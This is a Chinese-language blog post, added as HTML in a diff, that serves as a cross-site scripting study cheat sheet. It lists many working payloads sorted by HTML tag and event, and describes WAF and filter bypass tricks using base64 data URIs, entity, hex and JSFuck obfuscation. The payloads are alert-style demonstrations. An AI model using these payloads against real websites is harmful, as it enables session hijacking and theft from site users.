@@ -1,0 +1,1215 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="practice,XSS," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="XSS Base能够执行js的标签、事件、属性标签&amp;lt;script&amp;gt; &amp;lt;a&amp;gt; &amp;lt;p&amp;gt; &amp;lt;img&amp;gt; &amp;lt;body&amp;gt; &amp;lt;button&amp;gt; &amp;lt;var&amp;gt; &amp;lt;div&amp;gt; &amp;lt;iframe&amp;gt; &amp;lt;object&amp;gt; &amp;lt;input&amp;gt; &amp;lt;select&amp;gt; &amp;lt;textarea&amp;gt;">
+<meta name="keywords" content="practice,XSS">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS Base">
+<meta property="og:url" content="http://yoursite.com/2018/08/03/XSS-base/index.html">
+<meta property="og:site_name" content="Ahodor&#39;Via">
+<meta property="og:description" content="XSS Base能够执行js的标签、事件、属性标签&amp;lt;script&amp;gt; &amp;lt;a&amp;gt; &amp;lt;p&amp;gt; &amp;lt;img&amp;gt; &amp;lt;body&amp;gt; &amp;lt;button&amp;gt; &amp;lt;var&amp;gt; &amp;lt;div&amp;gt; &amp;lt;iframe&amp;gt; &amp;lt;object&amp;gt; &amp;lt;input&amp;gt; &amp;lt;select&amp;gt; &amp;lt;textarea&amp;gt;">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2018-08-03T07:58:27.357Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="XSS Base">
+<meta name="twitter:description" content="XSS Base能够执行js的标签、事件、属性标签&amp;lt;script&amp;gt; &amp;lt;a&amp;gt; &amp;lt;p&amp;gt; &amp;lt;img&amp;gt; &amp;lt;body&amp;gt; &amp;lt;button&amp;gt; &amp;lt;var&amp;gt; &amp;lt;div&amp;gt; &amp;lt;iframe&amp;gt; &amp;lt;object&amp;gt; &amp;lt;input&amp;gt; &amp;lt;select&amp;gt; &amp;lt;textarea&amp;gt;">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/08/03/XSS-base/"/>
+
+
+
+
+
+  <title>XSS Base | Ahodor'Via</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Ahodor'Via</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="Searching..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/08/03/XSS-base/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ahodor">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ahodor'Via">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">XSS Base</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-08-03T15:53:10+08:00">
+                2018-08-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="XSS-Base"><a href="#XSS-Base" class="headerlink" title="XSS Base"></a>XSS Base</h1><h2 id="能够执行js的标签、事件、属性"><a href="#能够执行js的标签、事件、属性" class="headerlink" title="能够执行js的标签、事件、属性"></a>能够执行js的标签、事件、属性</h2><h3 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h3><pre><code>&lt;script&gt; &lt;a&gt; &lt;p&gt; &lt;img&gt; &lt;body&gt; &lt;button&gt; &lt;var&gt; &lt;div&gt; &lt;iframe&gt; &lt;object&gt; &lt;input&gt;
+&lt;select&gt; &lt;textarea&gt; &lt;keygen&gt; &lt;frameset&gt; &lt;embed&gt; &lt;svg&gt; &lt;math&gt; &lt;video&gt; &lt;audio&gt;
+</code></pre><h3 id="所有的event事件都可以执行js"><a href="#所有的event事件都可以执行js" class="headerlink" title="所有的event事件都可以执行js"></a>所有的event事件都可以执行js</h3><pre><code>onload onunload onchange onchange onsubmit onreset onselect onblur onfocus onabort onkeydown onkeypress onkeyup onclick ondbclick onmouseover onmousemove onmouseout onmouseup onforminput onformchange ondrag ondrop
+</code></pre><h3 id="可以执行js的属性"><a href="#可以执行js的属性" class="headerlink" title="可以执行js的属性"></a>可以执行js的属性</h3><pre><code>formaction action href xlink:href autofocus src content data
+</code></pre><h2 id="xss绕过方式"><a href="#xss绕过方式" class="headerlink" title="xss绕过方式"></a>xss绕过方式</h2><h3 id="自定义标签"><a href="#自定义标签" class="headerlink" title="自定义标签"></a>自定义标签</h3><pre><code>&lt;M/onclick=&quot;alert(1)&quot;&gt;M
+</code></pre><h3 id="代替-空格"><a href="#代替-空格" class="headerlink" title="/ 代替 空格"></a>/ 代替 空格</h3><p>在标签和属性之间不一定只能出现空格,使用/代替空格</p>
+<pre><code>&lt;img/src=x onerror=alert(1)&gt;
+</code></pre><h3 id="最短字符"><a href="#最短字符" class="headerlink" title="最短字符"></a>最短字符</h3><h3 id="a标签"><a href="#a标签" class="headerlink" title="a标签"></a>a标签</h3><p>1、通过JavaScript伪造协议来调用js</p>
+<pre><code>&lt;a href=javascript:alert(1)&gt;A
+</code></pre><p>2、通过data协议来执行JavaScript，进一步的话可以对payload进行编码（base64，urlencode,hex,demical,html实体编码）(不进行编码也是可以的)</p>
+<pre><code>&lt;a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgzKTwvc2NyaXB0Pg==&gt; 
+//base64解码为&lt;script&gt;alert(1)&lt;/script&gt;
+
+&lt;a href=data:text/html;%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%2829%29%3C%2F%73%63%72%69%70%74%3E&gt;M 
+
+&lt;a href=j&amp;#x61;v&amp;#97script&amp;#x3A;&amp;#97lert(13)&gt;M
+
+&lt;svg&gt;&lt;a xlink:href=&quot;javascript:alert(14)&quot;&gt;&lt;rect width=&quot;1000&quot; height=&quot;1000&quot; fill=&quot;white&quot;/&gt;&lt;/a&gt;&lt;/svg&gt; 
+
+&lt;math&gt;&lt;a xlink:href=javascript:alert(1)&gt;M
+</code></pre><h3 id="各种编码绕过"><a href="#各种编码绕过" class="headerlink" title="各种编码绕过"></a>各种编码绕过</h3><h4 id="百分之百分号"><a href="#百分之百分号" class="headerlink" title="百分之百分号"></a>百分之百分号</h4><pre><code>把%给url编码成%25，如果在后台对参数有再次进行urldecode，或者输出时有urldecode那么就可以绕过WAF，
+</code></pre><h4 id="base64编码绕过"><a href="#base64编码绕过" class="headerlink" title="base64编码绕过"></a>base64编码绕过</h4><p>不过滤&lt;&gt;但过滤script 和事件操作 onxxxx的时候，使用base64编码来绕过</p>
+<pre><code>&lt;iframe src=”data:text/html;base64,PHNjcmlwdD5hbGVydCgnYmFzZTY0X2lmcmFtZScpPC9zY3JpcHQ+”&gt;
+</code></pre><h4 id="HTML实体编码的利用绕过waf"><a href="#HTML实体编码的利用绕过waf" class="headerlink" title="HTML实体编码的利用绕过waf"></a>HTML实体编码的利用绕过waf</h4><pre><code>&lt;a href= ‘javascript:alert&amp;#40;&amp;#39;123&amp;#39;&amp;#41; ‘&gt;Hello&lt;/a&gt;
+
+&lt;a href= “j&amp;#97;vascript:alert&amp;#40; ’123′ &amp;#41;“&gt;Hello&lt;/a &gt;
+
+&lt;a  href=  “j&amp;#97;vascript:alert&amp;#0000040;  ’123′ &amp;#41;“&gt;Hello&lt;/a &gt;
+
+&lt;a  href=  “j&amp;#97vascript:alert&amp;#0000040’123′ &amp;#41“&gt;Hello&lt;/a &gt;
+</code></pre><p>在标签内的所有伪协议JS代码都是可以不用双引号包裹的</p>
+<h4 id="eval函数"><a href="#eval函数" class="headerlink" title="eval函数"></a>eval函数</h4><p>eval函数认识\x十六进制\八进制\uunicode码（记得使用引号）</p>
+<pre><code>&lt;a  href=&quot;j&amp;#97;vascript:eval(&apos;&amp;#97;\x6c\x65\x72\x74\x28\x22\x31\x22\x29&apos;)&quot;&gt;Hello&lt;/a&gt;
+&lt;a  href=&quot;j&amp;#97;vascript:eval(&apos;&amp;#97;\u0091\x65\x72\x74\x28\x22\x31\x22\x29&apos;)&quot;&gt;Hello&lt;/a&gt;
+&lt;a  href=&quot;j&amp;#97;vascript:eval(&apos;&amp;#97;\154\x65\x72\x74\x28\x22\x31\x22\x29&apos;)&quot;&gt;Hello&lt;/a&gt;
+</code></pre><h3 id="script标签"><a href="#script标签" class="headerlink" title="script标签"></a>script标签</h3><p>1、jsfuck编码    <a href="http://www.jsfuck.com/" target="_blank" rel="noopener">http://www.jsfuck.com/</a> </p>
+<pre><code>&lt;script&gt;alert((+[][+[]]+[])[++[[]][+[]]]+([![]]+[])[++[++[[]][+[]]][+[]]]+([!![]]+[])[++[++[++[[]][+[]]][+[]]][+[]]]+([!![]]+[])[++[[]][+[]]]+([!![]]+[])[+[]])&lt;/script&gt;
+</code></pre><p>2、不规范的script标签 </p>
+<pre><code>&lt;script firefox&gt;alert(1)&lt;/script&gt;   
+</code></pre><p>3、可以用”/“来代替单引号和双引号 </p>
+<pre><code>script&gt;alert(/3/)&lt;/script&gt;
+</code></pre><p>4、如果输出是在setTimeout里，我们依然可以直接执行alert(1)</p>
+<pre><code>&lt;script&gt;setTimeout(&apos;alert(1)&apos;,0)&lt;/script&gt;
+</code></pre><p>5、不只是alert。prompt和confirm也可以弹窗 </p>
+<pre><code>&lt;script&gt;prompt(-[])&lt;/script&gt;
+</code></pre><p>6、各种编码方式</p>
+<pre><code>&lt;script&gt;alert(String.fromCharCode(49))&lt;/script&gt;
+</code></pre><h3 id="button标签"><a href="#button标签" class="headerlink" title="button标签"></a>button标签</h3><p>1、通过event事件来实现</p>
+<pre><code>&lt;button/onclick=alert(1)&gt;M&lt;/button&gt;
+</code></pre><p>2、如果on(event)被过滤了</p>
+<pre><code>&lt;form&gt;&lt;button formaction=javascript&amp;colon;alert(1)&gt;M
+
+加上autofocus自动弹窗，无需交互
+&lt;button onfocus=alert(1) autofocus&gt;
+</code></pre><h3 id="p标签"><a href="#p标签" class="headerlink" title="p标签"></a>p标签</h3><p>如果变量输出在p标签里，不一定要跳出标签，只要跳出””即可</p>
+<pre><code>&lt;p/onmouseover=javascript:alert(1);&gt;M&lt;/p&gt;
+</code></pre><h3 id="img标签"><a href="#img标签" class="headerlink" title="img标签"></a>img标签</h3><pre><code>&lt;img src=x onerror=alert(1)&gt;
+&lt;img src ?itworksonchrome&gt;\/onerror = alert(1)&gt;  //只在chrome下有效
+&lt;img src=x onerror=window.open(&apos;http://google.com&apos;);&gt;
+&lt;img/src/onerror=alert(1)&gt;  //只在chrome下有效
+&lt;img src=&quot;x:test&quot; onerror=&quot;alert(1)&quot;&gt;
+</code></pre><h3 id="body标签"><a href="#body标签" class="headerlink" title="body标签"></a>body标签</h3><p>通过使用event来调用</p>
+<pre><code>&lt;body onload=alert(1)&gt;
+&lt;body onscroll=alert(1)&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;
+</code></pre><h3 id="var标签"><a href="#var标签" class="headerlink" title="var标签"></a>var标签</h3><pre><code>&lt;var onmouseover=&quot;prompt(1)&quot;&gt;test&lt;/var&gt;
+</code></pre><h3 id="div标签"><a href="#div标签" class="headerlink" title="div标签"></a>div标签</h3><pre><code>&lt;div/onmouseover=&apos;alert(1)&apos;&gt;test
+&lt;div  style=&quot;position:absolute;top:0;left:0;width:100%;height:100%&quot;  onclick=&quot;alert(1)&quot;&gt;
+</code></pre><h3 id="iframe标签"><a href="#iframe标签" class="headerlink" title="iframe标签"></a>iframe标签</h3><h3 id="meta标签"><a href="#meta标签" class="headerlink" title="meta标签"></a>meta标签</h3><p>跳出当前属性在添加http-equiv=”refresh”，或者通过给http-equiv设置set-cookie来，进一步重新设置cookie</p>
+<pre><code>&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;javascript&amp;colon;alert(1)&quot;/&gt;? 
+&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;&gt;
+</code></pre><h3 id="object标签"><a href="#object标签" class="headerlink" title="object标签"></a>object标签</h3><p>和a标签的href属性玩法是一样的，不过优点是无须交互</p>
+<pre><code>&lt;object&gt; data=data:text/html;base64,PHNjcmlwdD5hbGVydCgiS0NGIik8L3NjcmlwdD4=&gt;&lt;/object&gt;
+</code></pre><h3 id="marquee标签"><a href="#marquee标签" class="headerlink" title="marquee标签"></a>marquee标签</h3><pre><code>&lt;marquee onstart=&quot;alert(&apos;sometext&apos;)&quot;&gt;&lt;/marquee&gt;
+</code></pre><h3 id="isindex标签"><a href="#isindex标签" class="headerlink" title="isindex标签"></a>isindex标签</h3><pre><code>&lt;isindex type=image src=1 onerror=alert(1)&gt;
+&lt;isindex action=javascript:alert(1) type=image&gt;
+</code></pre><h3 id="input标签"><a href="#input标签" class="headerlink" title="input标签"></a>input标签</h3><p>通过event来调用js。和之前的button的例子一样通过 autofocus来达到无须交互即可</p>
+<pre><code>&lt;input onfocus=javascript:alert(1) autofocus&gt;
+&lt;input onblur=javascript:alert(1) autofocus&gt;&lt;input autofocus&gt;
+</code></pre><h3 id="select标签"><a href="#select标签" class="headerlink" title="select标签"></a>select标签</h3><pre><code>&lt;select onfocus=javascript:alert(1) autofocus&gt;
+</code></pre><h3 id="textarea标签"><a href="#textarea标签" class="headerlink" title="textarea标签"></a>textarea标签</h3><pre><code>&lt;textarea onfocus=javascript:alert(1) autofocus&gt;
+</code></pre><h3 id="keygen标签"><a href="#keygen标签" class="headerlink" title="keygen标签"></a>keygen标签</h3><pre><code>&lt;keygen onfocus=javascript:alert(1) autofocus&gt;
+</code></pre><h3 id="frameset标签"><a href="#frameset标签" class="headerlink" title="frameset标签"></a>frameset标签</h3><pre><code>&lt;frameset onload=alert(1)&gt;
+</code></pre><h3 id="lt-embed标签-gt"><a href="#lt-embed标签-gt" class="headerlink" title="&lt;embed标签&gt;"></a>&lt;embed标签&gt;</h3><pre><code>&lt;embed src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgiS0NGIik8L3NjcmlwdD4=&quot;&gt;&lt;/embed&gt; //chrome 
+&lt;embed src=javascript:alert(1)&gt; //firefox
+</code></pre><h3 id="svg标签"><a href="#svg标签" class="headerlink" title="svg标签"></a>svg标签</h3><pre><code>&lt;svg onload=&quot;javascript:alert(1)&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;&lt;/svg&gt; 
+&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;&lt;g onload=&quot;javascript:alert(1)&quot;&gt;&lt;/g&gt;&lt;/svg&gt;  //chrome有效
+</code></pre><h3 id="math标签"><a href="#math标签" class="headerlink" title="math标签"></a>math标签</h3><pre><code>&lt;math href=&quot;javascript:javascript:alert(1)&quot;&gt;CLICKME&lt;/math&gt; 
+&lt;math&gt;&lt;y/xlink:href=javascript:alert(51)&gt;test1 
+&lt;math&gt; &lt;maction actiontype=&quot;statusline#http://wangnima.com&quot; 
+xlink:href=&quot;javascript:alert(49)&quot;&gt;CLICKME&lt;/maction&gt; &lt;/math&gt;
+</code></pre><h3 id="video标签"><a href="#video标签" class="headerlink" title="video标签"></a>video标签</h3><pre><code>&lt;video&gt;&lt;source onerror=&quot;alert(1)&quot;&gt; 
+&lt;video src=x onerror=alert(48)&gt;
+</code></pre><h3 id="audio标签"><a href="#audio标签" class="headerlink" title="audio标签"></a>audio标签</h3><pre><code>&lt;audio src=x onerror=alert(47)&gt;
+</code></pre><p>在这些标签里面凡是出现在on*事件值里面的javascript:都是多余的</p>
+<h2 id="平时搞XSS可能会用得到的技巧"><a href="#平时搞XSS可能会用得到的技巧" class="headerlink" title="平时搞XSS可能会用得到的技巧"></a>平时搞XSS可能会用得到的技巧</h2><h3 id="Referer为空才可以访问"><a href="#Referer为空才可以访问" class="headerlink" title="Referer为空才可以访问"></a>Referer为空才可以访问</h3><pre><code>有一些界面为了避免是别的地方跳转过来的 Referer必须为空，那什么情况Referer为空呢，第一是HTTPS协议到HTTP的协议，这时候Referer为空，或者用嵌入一个iframe用data加base64编码的方式，还可以用&lt;meta name=”referrer” content=”never” &gt;来达到referer为空
+</code></pre><h3 id="注意返回的type类型"><a href="#注意返回的type类型" class="headerlink" title="注意返回的type类型"></a>注意返回的type类型</h3><pre><code>返回什么样的类型决定了浏览器渲染还是不渲染你的XSS代码，只有返回的是XML或者HTML 才有可能会执行成功你的XSS代码，不过不同浏览器的特性不同，有一些返回的type类型可能也是可以执行XSS的，尤其是一些老的ie浏览器，具体可以看看freebuf之前发布过的一篇关于type和浏览器执行的表格。
+</code></pre><h3 id="阻止浏览器302跳转"><a href="#阻止浏览器302跳转" class="headerlink" title="阻止浏览器302跳转"></a>阻止浏览器302跳转</h3><pre><code>总所总之，浏览器遇到302，301会直接跟进头部的跳转链接，可是有时候XSS界面就是这个跳转页面，这个跳转url是可控的，并且在浏览器显示如果浏览器没有正确跳转，请点击XXX的字样。那怎么样才可以让浏览器不自动跳转呢？一种就是把跳转的url端口设置低于80 譬如输入http://xss.com:0”  onclick=”alert(/1/) ,还可以使用CSP策略嵌入一个iframe 拿来配合CRLF进行XSS会很舒服
+</code></pre><h3 id="注意头部的X-XSS-Protection"><a href="#注意头部的X-XSS-Protection" class="headerlink" title="注意头部的X-XSS-Protection"></a>注意头部的X-XSS-Protection</h3><pre><code>这个东西就是让浏览器帮助一起防御XSS 为0则不帮助，为1则把可能含有的在代码中直接拿掉，还有一个是类型1;black这样的，就是在url地址直接把认为可能是xss的拿掉，所以有时候并不是你的XSS代码被服务器过滤了，还有可能是被浏览器拿走了
+</code></pre><h2 id="HTML-Entity"><a href="#HTML-Entity" class="headerlink" title="HTML Entity"></a>HTML Entity</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>在编写HTML页面时，需要用到”&lt;”、”&gt;”、”空格”等符号，直接输入这些符号时，会错误的把它们与标记混在一起，非常不利于编码。</p>
+<p>那么就需要把这些字符进行转义，以另一种方式抒写，以相同的形式展现。</p>
+<p>在HTML中，这些字符可称为HTML Entity，即HTML 字符实体。一个HTML Entity都含有2种转义格式：Entity Name 和 Entity Number。</p>
+<h3 id="Entity-Name"><a href="#Entity-Name" class="headerlink" title="Entity Name"></a>Entity Name</h3><p>格式： &entityName; </p>
+<p>说明：”&amp;”开头，”;”结尾，以语义的形式描述字符。如字符”&lt;”，英文名称为”less than”，Entity Name为”&lt;”，取自”less than”2个单词的首字母。</p>
+<h3 id="Entity-Number"><a href="#Entity-Number" class="headerlink" title="Entity Number"></a>Entity Number</h3><p>格式： &#entityNumber; </p>
+<p>说明：”&amp;#”开头，”;”结尾，以编号的形式描述字符。此编号可以为十进制或十六进制(以”&amp;#x”开头)等数字格式。</p>
+<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><pre><code>&lt;p&gt;字符 ：&lt;&lt;/p&gt;
+&lt;p&gt;Entity Name ：&amp;lt;&lt;/p&gt;
+&lt;p&gt;Entity Number(十进制) ：&amp;#60;&lt;/p&gt;
+&lt;p&gt;Entity Number(十六进制) ：&amp;#x3c;&lt;/p&gt;
+</code></pre><p>Character </p>
+<pre><code>Character Entity        Entity Number(十进制)  Entity Number(十六进制)
+     　      &amp;nbsp;      &amp;#32;                   &amp;#x
+!    　      &amp;excl;      &amp;#33;                   &amp;#x21
+&quot;    　      &amp;quot;      &amp;#34;                   &amp;#x22
+#    　      &amp;num;       &amp;#35;                   &amp;#x23
+$        　  &amp;dollar;    &amp;#36;                   &amp;#x24
+%    　　　　&amp;percnt;    &amp;#37;                   &amp;#x25
+&amp;    　　　　&amp;amp;        &amp;#38;                   &amp;#x26
+&apos;    　　　　&amp;apos;      &amp;#39;                   &amp;#x27
+(    　　　　&amp;lpar;      &amp;#40;                   &amp;#x28
+)    　　　　&amp;rpar;      &amp;#41;                   &amp;#x29
+*    　　　　&amp;ast;       &amp;#42;                   &amp;#x2A
++    　　　　&amp;plus;      &amp;#43;                   &amp;#x2B
+,    　　　　&amp;comma;     &amp;#44;                   &amp;#x2C
+-    　　　　&amp;hyphen;     &amp;#45;                   &amp;#x2D
+.    　　　　&amp;period;    &amp;#46;                   &amp;#x2E
+/    　　　　&amp;sol;       &amp;#47;                   &amp;#x2F
+:    　　　　&amp;colon;     &amp;#58;                   &amp;#x3A
+;    　　　　&amp;semi;      &amp;#59;                   &amp;#x3B
+&lt;    　　　　&amp;lt;        &amp;#60;                   &amp;#x3C
+=    　　　　&amp;equals;    &amp;#61;                   &amp;#x3D
+&gt;    　　　　&amp;gt;        &amp;#62;                   &amp;#x3E
+?    　　　　&amp;quest;     &amp;#63;                   &amp;#x3F
+@    　　　　&amp;commat;     &amp;#64;                   &amp;#x40
+[    　　　　&amp;lsqb;      &amp;#91;                   &amp;#x5B
+\    　　　　&amp;bsol;      &amp;#92;                   &amp;#x5C
+]    　　　　&amp;rsqb;      &amp;#93;                   &amp;#x5D
+^    　　　　&amp;circ;      &amp;#94;                   &amp;#x5E
+_    　　　　&amp;lowbar;    &amp;#95;                   &amp;#x5F
+`    　　　　&amp;grave;     &amp;#96;                   &amp;#x60
+{    　　　　&amp;lcub;      &amp;#123;                  &amp;#x7B
+|    　　　　&amp;verbar;    &amp;#124;                  &amp;#x7C
+}    　　　　&amp;rcub;      &amp;#125;                  &amp;#x7D
+~    　　　　&amp;tilde;     &amp;#126;                  &amp;#x7E
+</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://qingbob.com/Excess-XSS/" target="_blank" rel="noopener">了解XSS攻击</a></p>
+<p><a href="https://www.hackersb.cn/hacker/85.html" target="_blank" rel="noopener">SVG XSS的一个黑魔法</a></p>
+<p><a href="http://www.freebuf.com/articles/web/157589.html" target="_blank" rel="noopener">可以被XSS利用的HTML标签和一些手段技巧</a></p>
+<p><a href="http://www.cnblogs.com/polk6/p/html-entity.html" target="_blank" rel="noopener">HTML Entity字符实体</a></p>
+<p><a href="https://dev.w3.org/html5/html-author/charref" target="_blank" rel="noopener">HTML Entity 字符对照表</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/practice/" rel="tag"># practice</a>
+          
+            <a href="/tags/XSS/" rel="tag"># XSS</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/07/31/DVWA-Command_Injection/" rel="next" title="DVWA-File_Injection">
+                <i class="fa fa-chevron-left"></i> DVWA-File_Injection
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/08/03/Wargame-alert(1)-haozi/" rel="prev" title="Wargame-XSS-game">
+                Wargame-XSS-game <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Ahodor</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
